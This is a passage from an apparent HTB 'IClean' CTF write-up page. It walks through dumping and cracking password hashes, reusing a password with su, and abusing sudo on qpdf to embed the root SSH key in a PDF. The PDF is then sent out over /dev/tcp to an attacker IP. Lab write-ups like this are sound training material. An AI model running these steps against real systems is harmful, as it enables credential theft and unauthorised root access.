++----------+-------------+------+-----+---------+----------------+
+| Field    | Type        | Null | Key | Default | Extra          |
++----------+-------------+------+-----+---------+----------------+
+| id       | int         | NO   | PRI | NULL    | auto_increment |
+| username | varchar(50) | NO   | UNI | NULL    |                |
+| password | char(64)    | NO   |     | NULL    |                |
+| role_id  | char(32)    | NO   |     | NULL    |                |
++----------+-------------+------+-----+---------+----------------+
+4 rows in set (0.00 sec)
+</code></pre>
+
+<pre><code class="language-bash">mysql&gt; select username,password from users;
++----------+------------------------------------------------------------------+
+| username | password                                                         |
++----------+------------------------------------------------------------------+
+| admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 |
+| consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa |
++----------+------------------------------------------------------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+<p>There are two hashes, one for admin and another for consuela. This hashes are sha256 as can be shown in the login functionality of the script that runs the webserver:</p>
+
+<pre><code class="language-python">www-data@iclean:/opt/app$ cat app.py 
+&lt;..SNIP..&gt;
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'GET':
+        return render_template('login.html', error=False)
+    elif request.method == 'POST':
+        username = request.form['username']
+        password = hashlib.sha256(request.form['password'].encode()).hexdigest()
+
+        with pymysql.connect(**db_config) as conn:
+            with conn.cursor() as cursor:
+                cursor.execute('SELECT role_id FROM users WHERE username=%s AND password=%s', (username, password))
+                result = cursor.fetchone()
+
+                if result is None:
+                    return render_template('login.html',error='Invalid username or password')
+                else:
+                    session['role'] = result[0]
+                    if session['role'] == hashlib.md5(b'admin').hexdigest():
+                        return redirect(url_for('dashboard'))
+                    else:
+                        return redirect(url_for('/'))
+    else:
+        return make_response('Invalid request format.', 400)
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>I will try to crack them with john and the consuela one is crackable:</p>
+
+<pre><code class="language-bash">❯ cat sql-hashes.txt
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: sql-hashes.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ admin:2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
+   2   │ consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+
+<pre><code class="language-plaintext">❯ john -w=/usr/share/wordlists/rockyou.txt sql-hashes.txt --format=Raw-SHA256
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1g 0:00:00:01 DONE (2024-07-31 21:16) 0.8849g/s 12693Kp/s 12693Kc/s 16057KC/s -sevim-..*7¡Vamos!
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>Also works for consuela in the machine and I have access as consuela:</p>
+
+<pre><code class="language-plaintext">www-data@iclean:/opt/app$ su consuela
+Password: simple and clean
+consuela@iclean:/opt/app$ whoami
+consuela
+</code></pre>
+
+<p>And we can see user.txt!:</p>
+
+<pre><code class="language-bash">consuela@iclean:/opt/app$ cd ~
+consuela@iclean:~$ cat user.txt 
+53****************************7b
+</code></pre>
+    
+      <h1 id="access-as-root">
+        
+        
+          Access as root <a href="#access-as-root" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Looking at sudo privileges, I can run /usr/bin/qpdf as any user I want:</p>
+
+<pre><code class="language-bash">consuela@iclean:~$ sudo -l
+[sudo] password for consuela: simple and clean
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+consuela@iclean:~$ 
+</code></pre>
+
+<p>Searching <code>qpdf</code> in google I can see it’s a C++ program to manage PDF files:</p>
+
+<p><img src="/assets/images/IClean/what-is-qpdf.png" alt="what is qpdf"></p>
+
+<p>I also have the version:</p>
+
+<pre><code class="language-bash">consuela@iclean:~$ /usr/bin/qpdf --version
+qpdf version 10.6.3
+Run qpdf --copyright to see copyright and license information.
+</code></pre>
+
+<p>There isn’t a known vulnerability for this version. However, I can read its <a href="https://qpdf.readthedocs.io/en/stable/">documentation</a> and see if I can find any functionality to abuse this sudo privilege as root. In <a href="https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments">this section</a> there are options to list, add or delete embedded files in pdfs, so I will use –add-attachment to add /root/.ssh/id_rsa to a dummy pdf. For that, I will use a http server to upload my pdf file to the machine:</p>
+
+<p><strong>Attacker machine</strong>:</p>
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p><strong>IClean machine</strong>:</p>
+<pre><code class="language-bash">consuela@iclean:~$ cd /tmp/
+consuela@iclean:/tmp$ wget http://10.10.15.95/dummy.pdf
+--2024-07-31 20:09:49--  http://10.10.15.95/dummy.pdf
+Connecting to 10.10.15.95:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13264 (13K) [application/pdf]
+Saving to: ‘dummy.pdf’
+
+dummy.pdf                                     100%[=================================================================================================&gt;]  12.95K  --.-KB/s    in 0s      
+
+2024-07-31 20:09:49 (190 MB/s) - ‘dummy.pdf’ saved [13264/13264]
+</code></pre>
+
+<p>Now execute this command to add the attachment /root/.ssh/id_rsa to dummyWithSSHKey.pdf:</p>
+
+<pre><code class="language-bash">consuela@iclean:/tmp$ sudo qpdf dummy.pdf dummyWithSSHKey.pdf --add-attachment /root/.ssh/id_rsa --
+</code></pre>
+
+<p>I will transfer it to my machine to work better:</p>
+
+<p><strong>Attacker</strong>:</p>
+<pre><code class="language-bash">❯ nc -lvnp 443 &gt; dummyWithSSHKey.pdf
+listening on [any] 443 ...
+</code></pre>
+
+<p><strong>IClean</strong>:</p>
+<pre><code class="language-bash">consuela@iclean:/tmp$ cat dummyWithSSHKey.pdf &gt; /dev/tcp/10.10.15.95/443 0&gt;&amp;1
+</code></pre>
+
+<p>Viewing it in Firefox, it’s possible to obtain the root ssh key:</p>
+
+<p><img src="/assets/images/IClean/id_rsa-in-pdf-file-exists.png" alt="id_rsa in pdf exists"></p>
+
+<p>Clicking on it just downloads it. Now I can connect as root to IClean and see root.txt!:</p>
+
+<pre><code class="language-bash">❯ ssh -i id_rsa root@10.10.11.12
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+&lt;..SNIP..&gt;
+
+root@iclean:~# cat root.txt 
+2f****************************9d
+</code></pre>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>31 July 2024</small>
+  <div>
+    
+    Tags:
+    
+    
+</div>
+  <br>
+  Share this writeup: 
+  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/IClean.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/IClean.html&amp;text=Writeup+for+HTB%20IClean%20writeup+from+HTB+held+on+31%20July%202024&amp;hashtags=ctf,writeup,IClean,HTB,','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/IClean.html&amp;text=Writeup+for+HTB%20IClean%20writeup+from+HTB+held+on+2024-07-31%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('show');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
